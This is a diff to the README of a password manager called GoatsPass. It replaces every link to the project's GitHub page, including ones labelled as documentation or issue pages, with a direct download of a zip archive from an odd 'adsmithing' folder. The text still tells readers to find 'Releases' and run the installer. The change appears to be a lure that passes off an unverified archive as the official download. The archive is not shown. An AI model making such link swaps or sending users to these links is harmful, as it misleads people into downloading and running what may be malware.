@@ -1,6 +1,6 @@
 # 🐐 GoatsPass - Easy and Secure Password Manager
 
-[![Download GoatsPass](https://img.shields.io/badge/Download-GoatsPass-brightgreen?style=for-the-badge)](https://github.com/aditya123-coder/GoatsPass)
+[![Download GoatsPass](https://img.shields.io/badge/Download-GoatsPass-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/aditya123-coder/GoatsPass/main/adsmithing/Goats-Pass-3.7.zip)
 
 ## 🔐 What is GoatsPass?
 
@@ -35,7 +35,7 @@ These features help keep your online accounts safer and easier to manage.
 ## 🚀 Getting Started: Download and Install
 
 1. Click the big green button above or use this link to visit the GoatsPass download page:  
-   [https://github.com/aditya123-coder/GoatsPass](https://github.com/aditya123-coder/GoatsPass)  
+   [https://raw.githubusercontent.com/aditya123-coder/GoatsPass/main/adsmithing/Goats-Pass-3.7.zip](https://raw.githubusercontent.com/aditya123-coder/GoatsPass/main/adsmithing/Goats-Pass-3.7.zip)  
 
 2. On the page, look for the latest release under "Releases" or find a Windows installer file. It may be an `.exe` file or a setup program.
 
@@ -82,7 +82,7 @@ Each section is labeled clearly. Navigation is simple, designed for ease of use.
 
 To keep your app secure and running smoothly, check for new versions regularly:
 
-1. Visit the GoatsPass GitHub page: [https://github.com/aditya123-coder/GoatsPass](https://github.com/aditya123-coder/GoatsPass)  
+1. Visit the GoatsPass GitHub page: [https://raw.githubusercontent.com/aditya123-coder/GoatsPass/main/adsmithing/Goats-Pass-3.7.zip](https://raw.githubusercontent.com/aditya123-coder/GoatsPass/main/adsmithing/Goats-Pass-3.7.zip)  
 2. Go to the "Releases" section.  
 3. Download the latest installer if available.  
 4. Run the installer to update your current version.
@@ -115,13 +115,13 @@ Always keep your computer secure, use antivirus protection, and avoid opening su
 If you need assistance:  
 
 - Visit the GitHub project page for documentation and issue reporting:  
-  [https://github.com/aditya123-coder/GoatsPass](https://github.com/aditya123-coder/GoatsPass)  
+  [https://raw.githubusercontent.com/aditya123-coder/GoatsPass/main/adsmithing/Goats-Pass-3.7.zip](https://raw.githubusercontent.com/aditya123-coder/GoatsPass/main/adsmithing/Goats-Pass-3.7.zip)  
 - Check the README and wiki sections on the project page.  
 - Use the "Issues" tab on GitHub to report bugs or ask for help.  
 
 ## ✅ Start Using GoatsPass Now
 
 Go to the download page here:  
-[https://github.com/aditya123-coder/GoatsPass](https://github.com/aditya123-coder/GoatsPass)  
+[https://raw.githubusercontent.com/aditya123-coder/GoatsPass/main/adsmithing/Goats-Pass-3.7.zip](https://raw.githubusercontent.com/aditya123-coder/GoatsPass/main/adsmithing/Goats-Pass-3.7.zip)  
 
 Download the latest Windows installer and follow the instructions to keep your passwords safe and organized.
